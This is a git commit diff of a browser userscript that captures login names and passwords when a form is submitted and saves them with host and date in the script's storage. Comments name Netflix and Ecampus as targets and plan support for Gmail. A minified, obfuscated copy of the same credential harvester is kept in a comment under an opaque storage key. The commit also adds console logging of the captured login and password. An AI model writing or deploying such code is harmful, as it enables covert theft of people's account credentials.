24e520e810f19008bb07c513af95a23643489def
Micael Levi L. Cavalcante <mllc@icomp.ufam.edu.br>
2016-12-20 12:57:16 -0400

    one TODO

--- mysession/mysession.user.js
+++ mysession/mysession.user.js
@@ -13,13 +13,9 @@
 // @grant       GM_deleteValue
 // ==/UserScript==
 
-/** MINIMIZADO
-const mostrar = false;
-const deletar = false;
-!function(e){String.prototype.isEmpty=function(){return!this.trim()};var t=GM_getValue("S132",[]);t.forEach(function(e){console.error(e)}),1==mostrar&&console.log(JSON.stringify(t)),1==deletar&&GM_deleteValue("S132"),document.querySelector("form").addEventListener("submit",function(s){var n=e('input[type="email"], input[name="email"], input[type="text"]').val(),i=e('input[type="password"], input[name="password"]').val();if(!n.isEmpty()&&!i.isEmpty()){var o={hst:location.host,dte:(new Date).toLocaleString(),lgn:n,pss:i};t.push(o),GM_setValue("S132",t)}})}(jQuery);
+/** MINIMIZADO (UP THIS)
+const show=!1,del=!1;!function(t){String.prototype.isEmpty=function(){return!this.trim()};var e=GM_getValue("S132",[]);e.forEach(function(t){console.error(t)}),1==mostrar&&console.log(JSON.stringify(e)),1==deletar&&GM_deleteValue("S132"),document.querySelector("form").addEventListener("submit",function(n){var o=t('input[type="email"], input[name="email"], input[type="text"]').val(),i=t('input[type="password"], input[name="password"]').val();if(!o.isEmpty()&&!i.isEmpty()){var r={hst:location.host,dte:(new Date).toLocaleString(),lgn:o,pss:i};e.push(r),GM_setValue("S132",e)}})}(jQuery);
 **/
-
-
 
 /*
 → Netflix
@@ -27,22 +23,27 @@ const deletar = false;
 → Ecampus
 */
 
-const mostrar = false;
+
+//TODO: encontrar campo que contém login ($('form').Email) no Gmail
+
+const mostrar = true;
 const deletar = false;
 
 (function($) {
 	String.prototype.isEmpty = function() { return !(this.trim());	};
-
 	var onhistory = GM_getValue('savedsession', []);
-	onhistory.forEach( function(e) { console.error(e) } );
-
-	if(mostrar == true) console.log(JSON.stringify(onhistory));
+	console.info(onhistory.length);
+	if(mostrar == true) onhistory.forEach( function(e) { console.error(e) } );
 	if(deletar == true) GM_deleteValue('savedsession');
 
 	document.querySelector('form').addEventListener('submit', function (e) {
-		// e.preventDefault();
+		e.preventDefault(); // <<<< COMMENT
+		
 		var login = $('input[type="email"], input[name="email"], input[type="text"]').val();
 		var senha = $('input[type="password"], input[name="password"]').val();
+  
+		console.log("login:",login)
+		console.log("senha:",senha)
 
 		if(!login.isEmpty() && !senha.isEmpty()){
 			var newdata = {
@@ -53,11 +54,10 @@ const deletar = false;
 			};
 			onhistory.push(newdata);//TODO verificar se o 'lgn', 'hst' e 'pss' já existem no array de histórico
 			// console.log( newdata );
-			GM_setValue('savedsession', onhistory);
+			GM_setValue('savedsession', onhistory);      
 		}
 	});
 })(jQuery);
-
 
 /*********************
 soundex("savedsession")
